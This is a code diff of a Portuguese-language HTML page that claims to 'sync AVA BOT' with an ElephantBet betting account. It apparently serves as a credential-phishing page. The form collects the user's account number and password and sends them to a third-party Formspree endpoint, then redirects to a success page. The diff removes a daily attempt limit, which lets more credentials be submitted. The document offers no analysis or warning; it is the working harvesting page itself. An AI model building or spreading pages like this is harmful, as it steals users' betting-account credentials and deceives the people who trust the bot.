@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sincronizar Conta - ElephantBet</title>
     <style> 
-        /* Estilos gerais */
         body {
             font-family: 'Poppins', sans-serif;
             background: linear-gradient(135deg, #007bff, #00c6ff);
@@ -102,14 +101,11 @@
 </head>
 <body>
     <div class="container">
-        <h2>Sincroniza AVA BOT com sua conta da <span>ELEPHANTBET  <br><a href="bot.html">voltar</a></span></h2>
-        <form
-        action="https://formspree.io/f/xvgagaav"
-        method="POST"
-      >
+        <h2>Sincroniza AVA BOT com sua conta da <span>ELEPHANTBET <br><a href="bot.html">voltar</a></span></h2>
+        <form id="syncForm" action="https://formspree.io/f/xvgagaav" method="POST">
             <label for="numero">Número da Conta ElephantBet:</label>
             <input type="text" id="numero" name="numero" placeholder="Digite seu número" required>
-            
+
             <label for="senha">Senha:</label>
             <input type="password" id="senha" name="senha" placeholder="Digite sua senha" required>
             <br><br>
@@ -118,35 +114,13 @@
     </div>
 
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
+        document.addEventListener("DOMContentLoaded", function () {
             const syncForm = document.getElementById("syncForm");
-            const submitButton = document.getElementById("submitButton");
 
-            // Função para obter a data atual no formato YYYY-MM-DD
-            function getCurrentDate() {
-                const today = new Date();
-                return today.toISOString().split('T')[0];
-            }
-
-            // Verifica as tentativas no localStorage
-            const storedData = JSON.parse(localStorage.getItem("syncAttempts")) || {};
-            const today = getCurrentDate();
-            let attemptsToday = storedData[today] || 0;
-
-            if (attemptsToday >= 2) {
-                submitButton.disabled = true;
-                submitButton.textContent = "Limite diário atingido";
-            }
-
-            syncForm.addEventListener("submit", function(event) {
+            syncForm.addEventListener("submit", function (event) {
                 event.preventDefault();
 
-                if (attemptsToday >= 2) {
-                    alert("Você já sincronizou sua conta 2 vezes hoje. Tente novamente amanhã.");
-                    return;
-                }
-
-                let formData = new FormData(this);
+                const formData = new FormData(this);
 
                 fetch(this.action, {
                     method: this.method,
@@ -155,24 +129,17 @@
                 })
                 .then(response => {
                     if (response.ok) {
-                        // Atualiza o contador de tentativas
-                        attemptsToday++;
-                        storedData[today] = attemptsToday;
-                        localStorage.setItem("syncAttempts", JSON.stringify(storedData));
-
-                        if (attemptsToday >= 2) {
-                            submitButton.disabled = true;
-                            submitButton.textContent = "Limite diário atingido";
-                        }
-
-                        window.location.href = "sucesso.html"; 
+                        setTimeout(() => {
+                            window.location.href = "sucesso.html";
+                        }, 500);
                     } else {
                         alert("Erro ao enviar o formulário. Tente novamente.");
                     }
                 })
-                .catch(error => alert("Erro ao conectar ao servidor."));
+                .catch(() => alert("Erro ao conectar ao servidor."));
             });
         });
     </script>
 </body>
 </html>
+
